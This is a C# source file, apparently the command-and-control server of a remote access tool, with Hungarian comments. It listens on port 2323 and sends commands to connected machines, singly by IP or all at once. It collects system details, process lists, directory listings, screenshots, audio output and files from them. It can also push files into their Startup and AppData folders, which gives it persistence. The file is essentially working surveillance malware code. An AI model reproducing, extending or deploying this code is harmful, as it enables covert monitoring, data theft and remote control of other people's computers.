using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Net;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using static negnox.Classok.Components;
using static negnox.Program;
using System.Management;
using System.Diagnostics;

namespace negnox.Classok
{
    public class TCPHelper
    {

        public static async Task listen()
        {
            TcpListener listener = new TcpListener(IPAddress.Any, 2323);
            listener.Start();
            //Console.ForegroundColor = ConsoleColor.Magenta;
            //Console.WriteLine("[Listener elindult...]");
            //Console.ForegroundColor = ConsoleColor.Gray;

            while (true)
            {
                TcpClient client = await listener.AcceptTcpClientAsync();
                kliensek.Add(client);
                if (isPromptLive) Console.WriteLine();
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.WriteLine($"{client.Client.RemoteEndPoint} joined the game.");
                Console.ForegroundColor = ConsoleColor.Gray;
                LogTxt($"{client.Client.RemoteEndPoint} joined the game.");
                if (isPromptLive) WritePrompt();


                //kulon szalon monitorozom hogy lecsatlakozott e
                //igen ez egy gyengeseg, ha valaki rájön, engem ki tud fagyasztani a picsaba

                _ = Task.Run(() => MonitorClient(client));
            }
        }

        public static string receivedFileName = "";
        public static async Task MonitorClient(TcpClient client)
        {
            try
            {
                var stream = client.GetStream();
                byte[] buffer = new byte[10000];

                // Nem várunk valódi adatot, csak azt figyeljük, él-e még
                int bytes = await stream.ReadAsync(buffer, 0, buffer.Length);
                while (bytes > 0)
                {
                    //int bytes = stream.Read(buffer, 0, buffer.Length);
                    //text = Encoding.UTF8.GetString(buffer, 0, bytes);
                    string text = Encoding.UTF8.GetString(buffer, 0, bytes);

                    string[] adat = text.Split('|');
                    //Console.WriteLine(text);
                    switch (adat[0])
                    {

                        case "sysinfo":
                            //sysinfo|[wininfo]|[whoami]|[usedram]|[maxram]|[usedcpu]|[hostname]|
                            string ouputinfo = $"\n{adat[1]}\n           RAM : \n    {adat[3]} MB / {adat[4]} MB\n";
                            double hanyszazalekmentel = (30 / Convert.ToDouble(adat[4])) * Convert.ToDouble(adat[3]);
                            ouputinfo += '|';
                            try
                            {
                                for (int i = 0; i < 30; i++)
                                {
                                    if (i <= Convert.ToInt32(hanyszazalekmentel))
                                    {
                                        ouputinfo += '#';
                                    }
                                    else ouputinfo += '-';
                                }
                                ouputinfo += "|\n";
                                //cpu-------------------------------------------
                                ouputinfo += $"     CPU Usage: {adat[5]:0.00}%\n";
                                double cpuszazalekbar = (30 / Convert.ToDouble(100)) * Convert.ToDouble(adat[5]);
                                ouputinfo += '|';
                                for (int i = 0; i < 30; i++)
                                {
                                    if (i <= Convert.ToInt32(cpuszazalekbar))
                                    {
                                        ouputinfo += '#';
                                    }
                                    else ouputinfo += '-';
                                }
                                ouputinfo += $"|\n\nhostname:{adat[6]}\nwhoami : {adat[2]}\nVideo Drivers(bugos):\n{adat[7]}\n";
                                
                            }
                            catch (Exception e)
                            {
                                Console.WriteLine(e.ToString());
                            }
                            

                            Console.Write(ouputinfo);
                            LogTxt(ouputinfo);
                            if (isPromptLive) WritePrompt();
                            break;
                        case "cmd":
                            Console.WriteLine();
                            Console.Write($"{adat[1]} {adat[2]}");
                            LogTxt($"{adat[1]} {adat[2]}");
                            break;
                        case "rp":
                            Console.WriteLine();
                            Console.WriteLine();
                            Console.WriteLine($"---Futó alkalmazások {targetIp} gépén: ---");
                            Console.WriteLine(adat[1]);
                            Console.WriteLine("-------------------------------------------");
                            LogTxt($"---Futó alkalmazások {targetIp} gépén: ---");
                            LogTxt(adat[1]);
                            LogTxt("-------------------------------------------");

                            if (isPromptLive) WritePrompt();
                            break;
                        case "screens":
                            Thread.Sleep(200);
                            Console.WriteLine();
                            //Console.WriteLine(adat[1]);
                            Log($"÷{targetIp}÷-nek a képernyői :");
                            Log("-------------------------------");
                            try
                            {
                                for (int i = 0; i < Convert.ToInt32(adat[1]); i++)
                                {
                                    Log($"|{adat[2 + i * 4]}| - fő monitor : {adat[3 + i * 4]} - x:{adat[4 + i * 4]} - y:{adat[5 + i * 4]}");
                                    Log("-------------------------------");
                                    Console.WriteLine();
                                    if (isPromptLive) WritePrompt();
                                }
                            }
                            catch (Exception)
                            {
                                Log("$elkurtad nandi$");
                            }
                            
                            break;

                        case "file":
                            try
                            {
                                if (!Directory.Exists("dataFromClients"))
                                {
                                    Directory.CreateDirectory("dataFromClients");
                                }
                                GetFile(stream, "melegvagy");
                                
                                if(screenShotJon) Process.Start($".\\dataFromClients\\{receivedFileName}");
                                screenShotJon = false;
                                if (isPromptLive) WritePrompt();
                            }
                            catch (Exception e)
                            {

                                Console.WriteLine(e) ;
                            }
                            
                            break;

                        case "ls":
                            //Console.WriteLine(adat[1]);
                            Console.WriteLine();
                            try
                            {
                                List<string> cuccokAKonyvtarban = new List<string>();
                                adat[1].Split('\n').ToList().ForEach(a => cuccokAKonyvtarban.Add(a));
                                Console.WriteLine("Show Directory:");
                                for (int k = 0; k < 70; k++) Console.Write("-");
                                //cuccokAKonyvtarban.ForEach(a => Console.WriteLine(a));
                                Console.WriteLine();
                                cuccokAKonyvtarban.RemoveAt(cuccokAKonyvtarban.Count()-1);
                                for (int i = 0; i < cuccokAKonyvtarban.Count(); i++)
                                {
                                    bool mappa = false;
                                    if (cuccokAKonyvtarban[i].Split('?')[1] == "mappa")
                                    {
                                        mappa = true;
                                    }
                                    string fajlnev = cuccokAKonyvtarban[i].Split('?')[0];
                                    //Log($"{fajlnev}");
                                    Console.Write(fajlnev);
                                    LogTxt(fajlnev);
                                    for (int k = 0; k < 70 - fajlnev.Length; k++)
                                    {
                                        Console.Write(' ');
                                    }
                                    if (mappa) Log("÷[MAPPA]÷");
                                    else Log("|[FÁJL]|");
                                }
                                for (int k = 0; k < 70; k++) Console.Write("-");
                                Console.WriteLine();
                            }
                            catch (Exception e)
                            {
                                Console.WriteLine(e.ToString());
                            }
                            if (isPromptLive) WritePrompt();
                            break;
                        case "pwd":
                            Console.ForegroundColor = ConsoleColor.Blue;
                            Console.WriteLine(adat[1]);
                            Console.ForegroundColor = ConsoleColor.Gray;
                            LogTxt(adat[1]);
                            if (isPromptLive) WritePrompt();
                            break;
                        case "cd":
                            Console.WriteLine(adat[1]);
                            LogTxt(adat[1]);
                            if (isPromptLive) WritePrompt();
                            break;
                        case "download":
                            Log("$Nem sikerült a letöltés$");
                            if (isPromptLive) WritePrompt();
                            break;

                        case "audio":
                            Console.WriteLine(adat[1]);
                            LogTxt(adat[1]);
                            break;



                        
                        default:
                            break;
                    }

                    bytes = await stream.ReadAsync(buffer, 0, buffer.Length);

                }
            }
            catch
            {
            }
            finally
            {
                if (isPromptLive) Console.WriteLine();
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.WriteLine($"{client.Client.RemoteEndPoint} left the game.");
                Console.ForegroundColor = ConsoleColor.Gray;
                LogTxt($"{client.Client.RemoteEndPoint} left the game.");
                if (isPromptLive) WritePrompt();
                kliensek.Remove(client);
                client.Close();
            }
        }
        public static void Send(string message)
        {
            Thread.Sleep(100);
            byte[] data = Encoding.UTF8.GetBytes(message);
            if (vanTarget)
            {
                // Keressük a kliens listában
                var client = kliensek.FirstOrDefault(c =>
                    ((IPEndPoint)c.Client.RemoteEndPoint).Address.ToString() == targetIp);

                if (client != null)
                {
                    try
                    {
                        client.GetStream().Write(data, 0, data.Length);
                        if (logSendingPackets) Log($"[÷{message}÷ |elküldve erre :| ÷{targetIp}÷]");
                    }
                    catch
                    {
                        if (logSendingPackets) Log($"[$Hiba a küldés során$÷ {targetIp}÷$-nek.$]");
                    }
                }
                else
                {
                    if (logSendingPackets) Log($"[$Nincs ilyen kliens:$÷ {targetIp}÷]");
                }
            }
            else
            {
                foreach (var client in kliensek.ToList())
                {
                    try
                    {
                        client.GetStream().Write(data, 0, data.Length);

                        if (logSendingPackets) Log($"[÷{message} ÷|elküldve ide :| ÷{((IPEndPoint)client.Client.RemoteEndPoint).Address.ToString()}÷|-nek|]");
                    }
                    catch
                    {
                        kliensek.Remove(client);
                    }
                }
            }
            Console.ForegroundColor = ConsoleColor.Gray;

        }

        public static void SendFile(string filePath, string targetFilePath)
        {
            if (filePath.Contains("%desktop%")) filePath = filePath.Replace("%desktop%", Environment.GetFolderPath(Environment.SpecialFolder.Desktop));
            else if (filePath.Contains("%appdata%")) filePath = filePath.Replace("%appdata%", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
            else if (filePath.Contains("%startup%")) filePath = filePath.Replace("%startup%", Environment.GetFolderPath(Environment.SpecialFolder.Startup));
            else if (filePath.Contains("%startmenu%")) filePath = filePath.Replace("%startmenu%", Environment.GetFolderPath(Environment.SpecialFolder.StartMenu));

            if (!File.Exists(filePath))
            {
                Log("[Nincs ilyen fájl!]");
                return;
            }

            byte[] fileData = File.ReadAllBytes(filePath);
            string fileName = Path.GetFileName(filePath);

            string header = $"file|{fileName}|{fileData.Length}\n";


            lock (kliensek)
            {
                if (vanTarget)
                {
                    var client = kliensek.FirstOrDefault(c =>
                        ((IPEndPoint)c.Client.RemoteEndPoint).Address.ToString() == targetIp);

                    if (client == null)
                    {
                        Log($"[Nincs ilyen kliens: {targetIp}]");
                        return;
                    }

                    SendFileToClient(client, header, fileData, fileName, targetFilePath);
                }
                else
                {
                    foreach (var client in kliensek.ToList())
                    {
                        SendFileToClient(client, header, fileData, fileName, targetFilePath);
                    }
                }
            }
        }
        public static void SendFileToClient(TcpClient client, string header, byte[] fileData, string fileName, string targetFilePath)
        {
            byte[] headerFileData = Encoding.UTF8.GetBytes(header.Split('|')[0] + "|");
            byte[] headerFileNameData = Encoding.UTF8.GetBytes(header.Split('|')[1] + "|");
            byte[] headerFileLengthData = Encoding.UTF8.GetBytes(header.Split('|')[2] + "|");
            try
            {
                NetworkStream stream = client.GetStream();

                stream.Write(headerFileData, 0, headerFileData.Length);
                Log("[|headerFileData Elküldve|]");
                Thread.Sleep(500);
                //Console.Write("------"+targetFilePath);
                stream.Write(Encoding.UTF8.GetBytes(targetFilePath), 0, Encoding.UTF8.GetBytes(targetFilePath).Length);
                Log("[|dummyText Elküldve|]");
                Thread.Sleep(500);
                stream.Write(headerFileNameData, 0, headerFileNameData.Length);
                Log("[|headerFileNameData Elküldve|]");
                Thread.Sleep(500);
                stream.Write(headerFileLengthData, 0, headerFileLengthData.Length);
                Log("[|headerFileLengthData Elküldve|]");
                Thread.Sleep(500);
                stream.Write(fileData, 0, fileData.Length);
                Log("[|fileData Elküldve|]");

                Log($"[Fájl elküldve: {fileName} -> {((IPEndPoint)client.Client.RemoteEndPoint).Address}]");
            }
            catch (Exception ex)
            {
                Log($"[Fájl küldési hiba: {ex.Message}]");
                kliensek.Remove(client);
            }
        }


        static void GetFile(NetworkStream stream, string hova)
        {
            hova = ".\\dataFromClients";
            string fileName = ReadLine(stream);
            receivedFileName = fileName;
            string[] fileNameDarabolva = fileName.Split('\\');
            fileName = fileNameDarabolva.Last();
            //Console.WriteLine(ReadLine(stream));
            string asd = ReadLine(stream);
            //Console.ForegroundColor = ConsoleColor.Red;
            //Console.WriteLine(asd);
            //Console.ForegroundColor = ConsoleColor.Gray;
            long fileSize = long.Parse(asd);

            //Directory.CreateDirectory("received");

            string path = Path.Combine(hova, fileName);

            //Console.ForegroundColor = ConsoleColor.Magenta;
            //Console.WriteLine(path);
            //Console.ForegroundColor = ConsoleColor.Gray;

            using (FileStream fs = new FileStream(path, FileMode.Create))
            {
                byte[] buffer = new byte[8192];
                long totalRead = 0;

                while (totalRead < fileSize)
                {
                    int read = stream.Read(buffer, 0,
                        (int)Math.Min(buffer.Length, fileSize - totalRead));

                    if (read <= 0)
                        throw new IOException("Kapcsolat megszakadt");

                    fs.Write(buffer, 0, read);
                    totalRead += read;
                }
            }
            Log($"[|megjött a file| mentve : ÷.\\dataFromClients\\{fileName}÷]");

        }
        static string ReadLine(NetworkStream stream)
        {
            List<byte> bytes = new List<byte>();
            int b;

            while ((b = stream.ReadByte()) != -1)
            {
                if (b == '|')
                    break;

                bytes.Add((byte)b);
            }
            Console.WriteLine();
            Console.ForegroundColor = ConsoleColor.Magenta;
            Console.Write(Encoding.UTF8.GetString(bytes.ToArray()));
            Console.ForegroundColor = ConsoleColor.Gray;
            return Encoding.UTF8.GetString(bytes.ToArray());
        }

        public static void SendTo(string targetIp, string message)
        {
            byte[] data = Encoding.UTF8.GetBytes(message);

            TcpClient client = kliensek.FirstOrDefault(c =>
                    ((IPEndPoint)c.Client.RemoteEndPoint).Address.ToString() == targetIp);
            if (!targetIp.Contains(':'))
            {
                client = kliensek.FirstOrDefault(c =>
                    ((IPEndPoint)c.Client.RemoteEndPoint).Address.ToString() == targetIp);
            }
            else
            {
                client = kliensek.FirstOrDefault(c =>
                    (c.Client.RemoteEndPoint.ToString() == targetIp));
            }


            if (client != null)
            {
                try
                {
                    client.GetStream().Write(data, 0, data.Length);
                    Log($"[÷{message}÷ |elküldve erre :| ÷{targetIp}÷]");
                }
                catch
                {
                    Log($"[$Hiba a küldés során$÷ {targetIp}÷$-nek.$]");
                }
            }
            else
            {
                Log($"[$Nincs ilyen kliens:$÷ {targetIp}÷]");
            }
        }
    }
}
